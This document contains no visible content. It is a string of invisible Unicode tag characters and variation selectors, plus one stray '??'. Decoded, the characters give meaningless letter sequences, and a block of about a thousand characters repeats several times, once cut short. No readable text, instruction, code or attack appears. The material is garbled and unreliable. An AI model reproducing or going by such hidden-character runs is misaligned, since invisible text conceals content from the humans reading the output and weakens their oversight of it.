󠁒󠁖󠁛󠁕󠁒󠁝󠁜󠁒󠁛󠁓󠁖󠁟󠁐󠁚󠁓󠁙󠁋󠁎󠁒󠁂󠁂󠁉󠁛󠁕󠁍󠁋󠁔󠁎󠁄󠁃󠁃󠁐󠁐󠁈󠁉󠁋󠁎󠁎󠁅󠁄󠁃󠁃󠁓󠁞󠁖󠁍󠁌󠁌󠁕󠁍󠁆󠁊󠁃󠁃󠁕󠁊󠁂󠁌󠁉󠁖󠁕󠁂󠁖󠁋󠁅󠀺󠁝󠁒󠁋󠁂󠁂󠁕󠁆󠁎󠁞󠁕󠁍󠁖󠁖󠁈󠁎󠁌󠁋󠁕󠁊󠁋󠁌󠁍󠁍󠁄󠁌󠁌󠁋󠁋󠁋󠁋󠁊󠁂󠀺󠁄󠁅󠁎󠁆󠁅󠁎󠁎󠁍󠁕󠁕󠁔󠁔󠁔󠁔󠁔󠁃󠁃󠁛󠁣󠁜󠁋󠁓󠁔󠁌󠁔󠁌󠁔󠁋󠁂󠁑󠁔󠁄󠀻󠁃󠁄󠁌󠁅󠁄󠁎󠁄󠁄󠁄󠁎󠁖󠁖󠁞󠁞󠁖󠁖󠁖󠁕󠁝󠁓󠁔󠁌󠁋󠁊󠁓󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁓󠁓󠁃󠁋󠁋󠁃󠁃󠁃󠁃󠁃󠁋󠁌󠁋󠁌󠁌󠁌󠁌󠁌󠁌󠁓󠁓󠁋󠁋󠁋󠁋󠁓󠁋󠁒󠁚󠁚󠁙󠁉󠁉󠁉󠁉󠁉󠁉󠁉󠁁󠁁󠁁󠁉󠁉󠁑󠁑󠁓󠁔󠁔󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁛󠁔󠁌󠁍󠁍󠁅󠁅󠁅󠁅󠁅󠁅󠁅󠁅󠁄󠁄󠁄󠁄󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁔󠁕󠁍󠁌󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁄󠁄󠁌󠁌󠁌󠁍󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁌󠁃󠁃󠁋󠁂󠁈󠁊󠁌󠁅󠁎󠁅󠀼󠁄󠀼󠁄󠀼󠁄󠁄󠁄󠁄󠀻󠁃󠁃󠁃󠁋󠁋󠁔󠁔󠁔󠁕󠁍󠁅󠁅󠁄󠁃󠁋󠁌󠁌󠁄󠁄󠁄󠁄󠁍󠁍󠁍󠁍󠁍󠁕󠁌󠁋󠁂󠁊󠁊󠁊󠁒󠁒󠁔󠁔󠁕󠁕󠁕󠁍󠁍󠁍󠁍󠁍󠁌󠁌󠁍󠁍󠁕󠁍󠁍󠁍󠁅󠁌󠁋󠁓󠁚󠁑󠁐󠁒󠁓󠁔󠁌󠁍󠁄󠁄󠁃󠁃󠁃󠁃󠀻󠁋󠁋󠁕󠁖󠁎󠁅󠁑󠁊󠁋󠁉󠁋󠁂󠁈󠁊󠁂󠁋󠁃󠁊󠁖󠁂󠁆󠁖󠁕󠁋󠁖󠁓󠁆󠁊󠁓󠁎󠁖󠁍󠁕󠁂󠁎󠁕󠁊󠁑󠁓󠁎󠁎󠁕󠁕󠁉󠁈󠁑󠁒󠁊󠁑󠁕󠁐󠁖󠁍󠁙󠁕󠁈󠁝󠁂󠁒󠁕󠁊󠁊󠁋󠀣󠀢󠀢󠀢󠀥󠁃󠁂󠁂󠁁󠁌󠁄󠁌󠁎󠁅󠁍󠁌󠁑󠁑󠁉󠁓󠁕󠁋󠁕󠁍󠁃󠁋󠁋󠁋󠁎󠁕󠁋󠁆󠁆󠁜󠁆󠁋󠁎󠁒󠁓󠁒󠁂󠁓󠁖󠁓󠁋󠁊󠁒󠁓󠁋󠁓󠁋󠄄󠁋󠄍󠄄󠄅󠄍󠁍󠁓󠁃󠁕󠁛󠁜󠁔󠁒󠁖󠁛󠁕󠁒󠁝󠁜󠁒󠁛󠁓󠁖󠁟󠁐󠁚󠁓󠁙󠁋󠁎󠁒󠁂󠁂󠁉󠁛󠁕󠁍󠁋󠁔󠁎󠁄󠁃󠁃󠁐󠁐󠁈󠁉󠁋󠁎󠁎󠁅󠁄󠁃󠁃󠁓󠁞󠁖󠁍󠁌󠁌󠁕󠁍󠁆󠁊󠁃󠁃󠁕󠁊󠁂󠁌󠁉󠁖󠁕󠁂󠁖󠁋󠁅󠀺󠁝󠁒󠁋󠁂󠁂󠁕󠁆󠁎󠁞󠁕󠁍󠁖󠁖󠁈󠁎󠁌󠁋󠁕󠁊󠁋󠁌󠁍󠁍󠁄󠁌󠁌󠁋󠁋󠁋󠁋󠁊󠁂󠀺󠁄󠁅󠁎󠁆󠁅󠁎󠁎󠁍󠁕󠁕󠁔󠁔󠁔󠁔󠁔󠁃󠁃󠁛󠁣󠁜󠁋󠁓󠁔󠁌󠁔󠁌󠁔󠁋󠁂󠁑󠁔󠁄󠀻󠁃󠁄󠁌󠁅󠁄󠁎󠁄󠁄󠁄󠁎󠁖󠁖󠁞󠁞󠁖󠁖󠁖󠁕󠁝󠁓󠁔󠁌󠁋󠁊󠁓󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁓󠁓󠁃󠁋󠁋󠁃󠁃󠁃󠁃󠁃󠁋󠁌󠁋󠁌󠁌󠁌󠁌󠁌󠁌󠁓󠁓󠁋󠁋󠁋󠁋󠁓󠁋󠁒󠁚󠁚󠁙󠁉󠁉󠁉󠁉󠁉󠁉󠁉󠁁󠁁󠁁󠁉󠁉󠁑󠁑󠁓󠁔󠁔󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁛󠁔󠁌󠁍󠁍󠁅󠁅󠁅󠁅󠁅󠁅󠁅󠁅󠁄󠁄󠁄󠁄󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁔󠁕󠁍󠁌󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁄󠁄󠁌󠁌󠁌󠁍󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁌󠁃󠁃󠁋󠁂󠁈󠁊󠁌󠁅󠁎󠁅󠀼󠁄󠀼󠁄󠀼󠁄󠁄󠁄󠁄󠀻󠁃󠁃󠁃󠁋󠁋󠁔󠁔󠁔󠁕󠁍󠁅󠁅󠁄󠁃󠁋󠁌󠁌󠁄󠁄󠁄󠁄󠁍󠁍󠁍󠁍󠁍󠁕󠁌󠁋󠁂󠁊󠁊󠁊󠁒󠁒󠁔󠁔󠁕󠁕󠁕󠁍󠁍󠁍󠁍󠁍󠁌󠁌󠁍󠁍󠁕󠁍󠁍󠁍󠁅󠁌󠁋󠁓󠁚󠁑󠁐󠁒󠁓󠁔󠁌󠁍󠁄󠁄󠁃󠁃󠁃󠁃󠀻󠁋󠁋󠁕󠁖󠁎󠁅󠁑󠁊󠁋󠁉󠁋󠁂󠁈󠁊󠁂󠁋󠁃󠁊󠁖󠁂󠁆󠁖󠁕󠁋󠁖󠁓󠁆󠁊󠁓󠁎󠁖󠁍󠁕󠁂󠁎󠁕󠁊󠁑󠁓󠁎󠁎󠁕󠁕󠁉󠁈󠁑󠁒󠁊󠁑󠁕󠁐󠁖󠁍󠁙󠁕󠁈󠁝󠁂󠁒󠁕󠁊󠁊󠁋󠀣󠀢󠀢󠀢󠀥󠁃󠁂󠁂󠁁󠁌󠁄󠁌󠁎󠁅󠁍󠁌󠁑󠁑󠁉󠁓󠁕󠁋󠁕󠁍󠁃󠁋󠁋󠁋󠁎󠁕󠁋󠁆󠁆󠁜󠁆󠁋󠁎󠁒󠁓󠁒󠁂󠁓󠁖󠁓󠁋󠁊󠁒󠁓󠁋󠁓󠁋󠄄󠁋󠄍󠄄󠄅󠄍󠁍󠁓󠁃󠁕󠁛󠁜󠁔󠁒󠁖󠁛󠁕󠁒󠁝󠁜󠁒󠁛󠁓󠁖󠁟󠁐󠁚󠁓󠁙󠁋󠁎󠁒󠁂󠁂󠁉󠁛󠁕󠁍󠁋󠁔󠁎󠁄󠁃󠁃󠁐󠁐󠁈󠁉󠁋󠁎󠁎󠁅󠁄󠁃󠁃󠁓󠁞󠁖󠁍󠁌󠁌󠁕󠁍󠁆󠁊󠁃󠁃󠁕󠁊󠁂󠁌󠁉󠁖󠁕󠁂󠁖󠁋󠁅󠀺󠁝󠁒󠁋󠁂󠁂󠁕󠁆󠁎󠁞󠁕󠁍󠁖󠁖󠁈󠁎󠁌󠁋󠁕󠁊󠁋󠁌󠁍󠁍󠁄󠁌󠁌󠁋󠁋󠁋󠁋󠁊󠁂󠀺󠁄󠁅󠁎󠁆󠁅󠁎󠁎󠁍󠁕󠁕󠁔󠁔󠁔󠁔󠁔󠁃󠁃󠁛󠁣󠁜󠁋󠁓󠁔󠁌󠁔󠁌󠁔󠁋󠁂󠁑󠁔󠁄󠀻󠁃󠁄󠁌󠁅󠁄󠁎󠁄󠁄󠁄󠁎󠁖󠁖󠁞󠁞󠁖󠁖󠁖󠁕󠁝󠁓󠁔󠁌󠁋󠁊󠁓󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁓󠁓󠁃󠁋󠁋󠁃󠁃󠁃󠁃󠁃󠁋󠁌󠁋󠁌󠁌󠁌󠁌󠁌󠁌󠁓󠁓󠁋󠁋󠁋󠁋󠁓󠁋󠁒󠁚󠁚󠁙󠁉󠁉󠁉󠁉󠁉󠁉󠁉󠁁󠁁󠁁󠁉󠁉󠁑󠁑󠁓󠁔󠁔󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁛󠁔󠁌󠁍󠁍󠁅󠁅󠁅󠁅󠁅󠁅󠁅󠁅󠁄󠁄󠁄󠁄󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁔󠁕󠁍󠁌󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁄󠁄󠁌󠁌󠁌󠁍󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁌󠁃󠁃󠁋󠁂󠁈󠁊󠁌󠁅󠁎󠁅󠀼󠁄󠀼󠁄󠀼󠁄󠁄󠁄󠁄󠀻󠁃󠁃󠁃󠁋󠁋󠁔󠁔󠁔󠁕󠁍󠁅󠁅󠁄󠁃󠁋󠁌󠁌󠁄󠁄󠁄󠁄󠁍󠁍󠁍󠁍󠁍󠁕󠁌󠁋󠁂󠁊󠁊󠁊󠁒󠁒󠁔󠁔󠁕󠁕󠁕󠁍󠁍󠁍󠁍󠁍󠁌󠁌󠁍󠁍󠁕󠁍󠁍󠁍󠁅󠁌󠁋󠁓󠁚󠁑󠁐󠁒󠁓󠁔󠁌󠁍󠁄󠁄󠁃󠁃󠁃󠁃󠀻󠁋󠁋󠁕󠁖󠁎󠁅󠁑󠁊󠁋󠁉󠁋󠁂󠁈󠁊󠁂󠁋󠁃󠁊󠁖󠁂󠁆󠁖󠁕󠁋󠁖󠁓󠁆󠁊󠁓󠁎󠁖󠁍󠁕󠁂󠁎󠁕󠁊󠁑󠁓󠁎󠁎󠁕󠁕󠁉󠁈󠁑󠁒󠁊󠁑󠁕󠁐󠁖󠁍󠁙󠁕󠁈󠁝󠁂󠁒󠁕󠁊󠁊󠁋󠀣󠀢󠀢󠀢󠀥󠁃󠁂󠁂󠁁󠁌󠁄󠁌󠁎󠁅󠁍󠁌󠁑󠁑󠁉󠁓󠁕󠁋󠁕󠁍󠁃󠁋󠁋󠁋󠁎󠁕󠁋󠁆󠁆󠁜󠁆󠁋󠁎󠁒󠁓󠁒󠁂󠁓󠁖󠁓󠁋󠁊󠁒󠁓󠁋󠁓󠁋󠄄󠁋󠄍󠄄󠄅󠄍󠁍󠁓󠁃󠁕󠁛󠁜󠁔󠁒󠁖󠁛󠁕󠁒󠁝??󠁒󠁛󠁓󠁖󠁟󠁐󠁚󠁓󠁙󠁋󠁎󠁒󠁂󠁂󠁉󠁛󠁕󠁍󠁋󠁔󠁎󠁄󠁃󠁃󠁐󠁐󠁈󠁉󠁋󠁎󠁎󠁅󠁄󠁃󠁃󠁓󠁞󠁖󠁍󠁌󠁌󠁕󠁍󠁆󠁊󠁃󠁃󠁕󠁊󠁂󠁌󠁉󠁖󠁕󠁂󠁖󠁋󠁅󠀺󠁝󠁒󠁋󠁂󠁂󠁕󠁆󠁎󠁞󠁕󠁍󠁖󠁖󠁈󠁎󠁌󠁋󠁕󠁊󠁋󠁌󠁍󠁍󠁄󠁌󠁌󠁋󠁋󠁋󠁋󠁊󠁂󠀺󠁄󠁅󠁎󠁆󠁅󠁎󠁎󠁍󠁕󠁕󠁔󠁔󠁔󠁔󠁔󠁃󠁃󠁛󠁣󠁜󠁋󠁓󠁔󠁌󠁔󠁌󠁔󠁋󠁂󠁑󠁔󠁄󠀻󠁃󠁄󠁌󠁅󠁄󠁎󠁄󠁄󠁄󠁎󠁖󠁖󠁞󠁞󠁖󠁖󠁖󠁕󠁝󠁓󠁔󠁌󠁋󠁊󠁓󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁓󠁓󠁃󠁋󠁋󠁃󠁃󠁃󠁃󠁃󠁋󠁌󠁋󠁌󠁌󠁌󠁌󠁌󠁌󠁓󠁓󠁋󠁋󠁋󠁋󠁓󠁋󠁒󠁚󠁚󠁙󠁉󠁉󠁉󠁉󠁉󠁉󠁉󠁁󠁁󠁁󠁉󠁉󠁑󠁑󠁓󠁔󠁔󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁛󠁔󠁌󠁍󠁍󠁅󠁅󠁅󠁅󠁅󠁅󠁅󠁅󠁄󠁄󠁄󠁄󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁔󠁕󠁍󠁌󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁄󠁄󠁌󠁌󠁌󠁍󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁌󠁃󠁃󠁋󠁂󠁈󠁊󠁌󠁅󠁎󠁅󠀼󠁄󠀼󠁄󠀼󠁄󠁄󠁄󠁄󠀻󠁃󠁃󠁃󠁋󠁋󠁔󠁔󠁔󠁕󠁍󠁅󠁅󠁄󠁃󠁋󠁌󠁌󠁄󠁄󠁄󠁄󠁍󠁍󠁍󠁍󠁍󠁕󠁌󠁋󠁂󠁊󠁊󠁊󠁒󠁒󠁔󠁔󠁕󠁕󠁕󠁍󠁍󠁍󠁍󠁍󠁌󠁌󠁍󠁍󠁕󠁍󠁍󠁍󠁅󠁌󠁋󠁓󠁚󠁑󠁐󠁒󠁓󠁔󠁌󠁍󠁄󠁄󠁃󠁃󠁃󠁃󠀻󠁋󠁋󠁕󠁖󠁎󠁅󠁑󠁊󠁋󠁉󠁋󠁂󠁈󠁊󠁂󠁋󠁃󠁊󠁖󠁂󠁆󠁖󠁕󠁋󠁖󠁓󠁆󠁊󠁓󠁎󠁖󠁍󠁕󠁂󠁎󠁕󠁊󠁑󠁓󠁎󠁎󠁕󠁕󠁉󠁈󠁑󠁒󠁊󠁑󠁕󠁐󠁖󠁍󠁙󠁕󠁈󠁝󠁂󠁒󠁕󠁊󠁊󠁋󠀣󠀢󠀢󠀢󠀥󠁃󠁂󠁂󠁁󠁌󠁄󠁌󠁎󠁅󠁍󠁌󠁑󠁑󠁉󠁓󠁕󠁋󠁕󠁍󠁃󠁋󠁋󠁋󠁎󠁕󠁋󠁆󠁆󠁜󠁆󠁋󠁎󠁒󠁓󠁒󠁂󠁓󠁖󠁓󠁋󠁊󠁒󠁓󠁋󠁓󠁋󠄄󠁋󠄍󠄄󠄅󠄍󠁍󠁓󠁃󠁕󠁛󠁜󠁔󠁒󠁖󠁛󠁕󠁒󠁝󠁜󠁒󠁛󠁓󠁖󠁟󠁐󠁚󠁓󠁙󠁋󠁎󠁒󠁂󠁂󠁉󠁛󠁕󠁍󠁋󠁔󠁎󠁄󠁃󠁃󠁐󠁐󠁈󠁉󠁋󠁎󠁎󠁅󠁄󠁃󠁃󠁓󠁞󠁖󠁍󠁌󠁌󠁕󠁍󠁆󠁊󠁃󠁃󠁕󠁊󠁂󠁌󠁉󠁖󠁕󠁂󠁖󠁋󠁅󠀺󠁝󠁒󠁋󠁂󠁂󠁕󠁆󠁎󠁞󠁕󠁍󠁖󠁖󠁈󠁎󠁌󠁋󠁕󠁊󠁋󠁌󠁍󠁍󠁄󠁌󠁌󠁋󠁋󠁋󠁋󠁊󠁂󠀺󠁄󠁅󠁎󠁆󠁅󠁎󠁎󠁍󠁕󠁕󠁔󠁔󠁔󠁔󠁔󠁃󠁃󠁛󠁣󠁜󠁋󠁓󠁔󠁌󠁔󠁌󠁔󠁋󠁂󠁑󠁔󠁄󠀻󠁃󠁄󠁌󠁅󠁄󠁎󠁄󠁄󠁄󠁎󠁖󠁖󠁞󠁞󠁖󠁖󠁖󠁕󠁝󠁓󠁔󠁌󠁋󠁊󠁓󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁓󠁓󠁃󠁋󠁋󠁃󠁃󠁃󠁃󠁃󠁋󠁌󠁋󠁌󠁌󠁌󠁌󠁌󠁌󠁓󠁓󠁋󠁋󠁋󠁋󠁓󠁋󠁒󠁚󠁚󠁙󠁉󠁉󠁉󠁉󠁉󠁉󠁉󠁁󠁁󠁁󠁉󠁉󠁑󠁑󠁓󠁔󠁔󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁛󠁔󠁌󠁍󠁍󠁅󠁅󠁅󠁅󠁅󠁅󠁅󠁅󠁄󠁄󠁄󠁄󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁔󠁕󠁍󠁌󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁄󠁄󠁌󠁌󠁌󠁍󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁌󠁃󠁃󠁋󠁂󠁈󠁊󠁌󠁅󠁎󠁅󠀼󠁄󠀼󠁄󠀼󠁄󠁄󠁄󠁄󠀻󠁃󠁃󠁃󠁋󠁋󠁔󠁔󠁔󠁕󠁍󠁅󠁅󠁄󠁃󠁋󠁌󠁌󠁄󠁄󠁄󠁄󠁍󠁍󠁍󠁍󠁍󠁕󠁌󠁋󠁂󠁊󠁊󠁊󠁒󠁒󠁔󠁔󠁕󠁕󠁕󠁍󠁍󠁍󠁍󠁍󠁌󠁌󠁍󠁍󠁕󠁍󠁍󠁍󠁅󠁌󠁋󠁓󠁚󠁑󠁐󠁒󠁓󠁔󠁌󠁍󠁄󠁄󠁃󠁃󠁃󠁃󠀻󠁋󠁋󠁕󠁖󠁎󠁅󠁑󠁊󠁋󠁉󠁋󠁂󠁈󠁊󠁂󠁋󠁃󠁊󠁖󠁂󠁆󠁖󠁕󠁋󠁖󠁓󠁆󠁊󠁓󠁎󠁖󠁍󠁕󠁂󠁎󠁕󠁊󠁑󠁓󠁎󠁎󠁕󠁕󠁉󠁈󠁑󠁒󠁊󠁑󠁕󠁐󠁖󠁍󠁙󠁕󠁈󠁝󠁂󠁒󠁕󠁊󠁊󠁋󠀣󠀢󠀢󠀢󠀥󠁌󠁎󠁅󠁍󠁌󠁑󠁑󠁉󠁓󠁕󠁋󠁕󠁍󠁃󠁋󠁋󠁋󠁎󠁕󠁋󠁆󠁆󠁜󠁆󠁋󠁎󠁒󠁓󠁒󠁂󠁓󠁖󠁓󠁋󠁊󠁒󠁓󠁋󠁓󠁋󠄄󠁋󠄍󠄄󠄅󠄍󠁍󠁓󠁃󠁕󠁛󠁜󠁔󠁒󠁖󠁛󠁕󠁒󠁝󠁜󠁒󠁛󠁓󠁖󠁟󠁐󠁚󠁓󠁙󠁋󠁎󠁒󠁂󠁂󠁉󠁛󠁕󠁍󠁋󠁔󠁎󠁄󠁃󠁃󠁐󠁐󠁈󠁉󠁋󠁎󠁎󠁅󠁄󠁃󠁃󠁓󠁞󠁖󠁍󠁌󠁌󠁕󠁍󠁆󠁊󠁃󠁃󠁕󠁊󠁂󠁌󠁉󠁖󠁕󠁂󠁖󠁋󠁅󠀺󠁝󠁒󠁋󠁂󠁂󠁕󠁆󠁎󠁞󠁕󠁍󠁖󠁖󠁈󠁎󠁌󠁋󠁕󠁊󠁋󠁌󠁍󠁍󠁄󠁌󠁌󠁋󠁋󠁋󠁋󠁊󠁂󠀺󠁄󠁅󠁎󠁆󠁅󠁎󠁎󠁍󠁕󠁕󠁔󠁔󠁔󠁔󠁔󠁃󠁃󠁛󠁣󠁜󠁋󠁓󠁔󠁌󠁔󠁌󠁔󠁋󠁂󠁑󠁔󠁄󠀻󠁃󠁄󠁌󠁅󠁄󠁎󠁄󠁄󠁄󠁎󠁖󠁖󠁞󠁞󠁖󠁖󠁖󠁕󠁝󠁓󠁔󠁌󠁋󠁊󠁓󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁓󠁓󠁃󠁋󠁋󠁃󠁃󠁃󠁃󠁃󠁋󠁌󠁋󠁌󠁌󠁌󠁌󠁌󠁌󠁓󠁓󠁋󠁋󠁋󠁋󠁓󠁋󠁒󠁚󠁚󠁙󠁉󠁉󠁉󠁉󠁉󠁉󠁉󠁁󠁁󠁁󠁉󠁉󠁑󠁑󠁓󠁔󠁔󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁛󠁔󠁌󠁍󠁍󠁅󠁅󠁅󠁅󠁅󠁅󠁅󠁅󠁄󠁄󠁄󠁄󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁔󠁕󠁍󠁌󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁄󠁄󠁌󠁌󠁌󠁍󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁌󠁃󠁃󠁋󠁂󠁈󠁊󠁌󠁅󠁎󠁅󠀼󠁄󠀼󠁄󠀼󠁄󠁄󠁄󠁄󠀻󠁃󠁃󠁃󠁋󠁋󠁔󠁔󠁔󠁕󠁍󠁅󠁅󠁄󠁃󠁋󠁌󠁌󠁄󠁄󠁄󠁄󠁍󠁍󠁍󠁍󠁍󠁕󠁌󠁋󠁂󠁊󠁊󠁊󠁒󠁒󠁔󠁔󠁕󠁕󠁕󠁍󠁍󠁍󠁍󠁍󠁌󠁌󠁍󠁍󠁕󠁍󠁍󠁍󠁅󠁌󠁋󠁓󠁚󠁑󠁐󠁒󠁓󠁔󠁌󠁍󠁄󠁄󠁃󠁃󠁃󠁃󠀻󠁋󠁋󠁕󠁖󠁎󠁅󠁑󠁊󠁋󠁉󠁋󠁂󠁈󠁊󠁂󠁋󠁃󠁊󠁖󠁂󠁆󠁖󠁕󠁋󠁖󠁓󠁆󠁊󠁓󠁎󠁖󠁍󠁕󠁂󠁎󠁕󠁊󠁑󠁓󠁎󠁎󠁕󠁕󠁉󠁈󠁑󠁒󠁊󠁑󠁕󠁐󠁖󠁍󠁙󠁕󠁈󠁝󠁂󠁒󠁕󠁊󠁊󠁋󠀣󠀢󠀢󠀢󠀥󠁃󠁂󠁂󠁁󠁌󠁄󠁌󠁎󠁅󠁍󠁌󠁑󠁑󠁉󠁓󠁕󠁋󠁕󠁍󠁃󠁋󠁋󠁋󠁎󠁕󠁋󠁆󠁆󠁜󠁆󠁋󠁎󠁒󠁓󠁒󠁂󠁓󠁖󠁓󠁋󠁊󠁒󠁓󠁋󠁓󠁋󠄄󠁋󠄍󠄄󠄅󠄍󠁍󠁓󠁃󠁕󠁛󠁜󠁔󠁒󠁖󠁛󠁕󠁒󠁝󠁜󠁒󠁛󠁓󠁖󠁟󠁐󠁚󠁓󠁙󠁋󠁎󠁒󠁂󠁂󠁉󠁛󠁕󠁍󠁋󠁔󠁎󠁄󠁃󠁃󠁐󠁐󠁈󠁉󠁋󠁎󠁎󠁅󠁄󠁃󠁃󠁓󠁞󠁖󠁍󠁌󠁌󠁕󠁍󠁆󠁊󠁃󠁃󠁕󠁊󠁂󠁌󠁉󠁖󠁕󠁂󠁖󠁋󠁅󠀺󠁝󠁒󠁋󠁂󠁂󠁕󠁆󠁎󠁞󠁕󠁍󠁖󠁖󠁈󠁎󠁌󠁋󠁕󠁊󠁋󠁌󠁍󠁍󠁄󠁌󠁌󠁋󠁋󠁋󠁋󠁊󠁂󠀺󠁄󠁅󠁎󠁆󠁅󠁎󠁎󠁍󠁕󠁕󠁔󠁔󠁔󠁔󠁔󠁃󠁃󠁛󠁣󠁜󠁋󠁓󠁔󠁌󠁔󠁌󠁔󠁋󠁂󠁑󠁔󠁄󠀻󠁃󠁄󠁌󠁅󠁄󠁎󠁄󠁄󠁄󠁎󠁖󠁖󠁞󠁞󠁖󠁖󠁖󠁕󠁝󠁓󠁔󠁌󠁋󠁊󠁓󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁓󠁓󠁃󠁋󠁋󠁃󠁃󠁃󠁃󠁃󠁋󠁌󠁋󠁌󠁌󠁌󠁌󠁌󠁌󠁓󠁓󠁋󠁋󠁋󠁋󠁓󠁋󠁒󠁚󠁚󠁙󠁉󠁉󠁉󠁉󠁉󠁉󠁉󠁁󠁁󠁁󠁉󠁉󠁑󠁑󠁓󠁔󠁔󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁛󠁔󠁌󠁍󠁍󠁅󠁅󠁅󠁅󠁅󠁅󠁅󠁅󠁄󠁄󠁄󠁄󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁔󠁕󠁍󠁌󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁄󠁄󠁌󠁌󠁌󠁍󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁌󠁃󠁃󠁋󠁂󠁈󠁊󠁌󠁅󠁎󠁅󠀼󠁄󠀼󠁄󠀼󠁄󠁄󠁄󠁄󠀻󠁃󠁃󠁃󠁋󠁋󠁔󠁔󠁔󠁕󠁍󠁅󠁅󠁄󠁃󠁋󠁌󠁌󠁄󠁄󠁄󠁄󠁍󠁍󠁍󠁍󠁍󠁕󠁌󠁋󠁂󠁊󠁊󠁊󠁒󠁒󠁔󠁔󠁕󠁕󠁕󠁍󠁍󠁍󠁍󠁍󠁌󠁌󠁍󠁍󠁕󠁍󠁍󠁍󠁅󠁌󠁋󠁓󠁚󠁑󠁐󠁒󠁓󠁔󠁌󠁍󠁄󠁄󠁃󠁃󠁃󠁃󠀻󠁋󠁋󠁕󠁖󠁎󠁅󠁑󠁊󠁋󠁉󠁋󠁂󠁈󠁊󠁂󠁋󠁃󠁊󠁖󠁂󠁆󠁖󠁕󠁋󠁖󠁓󠁆󠁊󠁓󠁎󠁖󠁍󠁕󠁂󠁎󠁕󠁊󠁑󠁓󠁎󠁎󠁕󠁕󠁉󠁈󠁑󠁒󠁊󠁑󠁕󠁐󠁖󠁍󠁙󠁕󠁈󠁝󠁂󠁒󠁕󠁊󠁊󠁋󠀣󠀢󠀢󠀢󠀥󠁃󠁂󠁂󠁁󠁌󠁄󠁌󠁎󠁅󠁍󠁌󠁑󠁑󠁉󠁓󠁕󠁋󠁕󠁍󠁃󠁋󠁋󠁋󠁎󠁕󠁋󠁆󠁆󠁜󠁆󠁋󠁎󠁒󠁓󠁒󠁂󠁓󠁖󠁓󠁋󠁊󠁒󠁓󠁋󠁓󠁋󠄄󠁋󠄍󠄄󠄅󠄍󠁍󠁓󠁃󠁕󠁛󠁜󠁔󠁒󠁖󠁛󠁕󠁒󠁝󠁜󠁒󠁛󠁓󠁖󠁟󠁐󠁚󠁓󠁙󠁋󠁎󠁒󠁂󠁂󠁉󠁛󠁕󠁍󠁋󠁔󠁎󠁄󠁃󠁃󠁐󠁐󠁈󠁉󠁋󠁎󠁎󠁅󠁄󠁃󠁃󠁓󠁞󠁖󠁍󠁌󠁌󠁕󠁍󠁆󠁊󠁃󠁃󠁕󠁊󠁂󠁌󠁉󠁖󠁕󠁂󠁖󠁋󠁅󠀺󠁝󠁒󠁋󠁂󠁂󠁕󠁆󠁎󠁞󠁕󠁍󠁖󠁖󠁈󠁎󠁌󠁋󠁕󠁊󠁋󠁌󠁍󠁍󠁄󠁌󠁌󠁋󠁋󠁋󠁋󠁊󠁂󠀺󠁄󠁅󠁎󠁆󠁅󠁎󠁎󠁍󠁕󠁕󠁔󠁔󠁔󠁔󠁔󠁃󠁃󠁛󠁣󠁜󠁋󠁓󠁔󠁌󠁔󠁌󠁔󠁋󠁂󠁑󠁔󠁄󠀻󠁃󠁄󠁌󠁅󠁄󠁎󠁄󠁄󠁄󠁎󠁖󠁖󠁞󠁞󠁖󠁖󠁖󠁕󠁝󠁓󠁔󠁌󠁋󠁊󠁓󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁓󠁓󠁃󠁋󠁋󠁃󠁃󠁃󠁃󠁃󠁋󠁌󠁋󠁌󠁌󠁌󠁌󠁌󠁌󠁓󠁓󠁋󠁋󠁋󠁋󠁓󠁋󠁒󠁚󠁚󠁙󠁉󠁉󠁉󠁉󠁉󠁉󠁉󠁁󠁁󠁁󠁉󠁉󠁑󠁑󠁓󠁔󠁔󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁛󠁔󠁌󠁍󠁍󠁅󠁅󠁅󠁅󠁅󠁅󠁅󠁅󠁄󠁄󠁄󠁄󠁃󠁃󠁃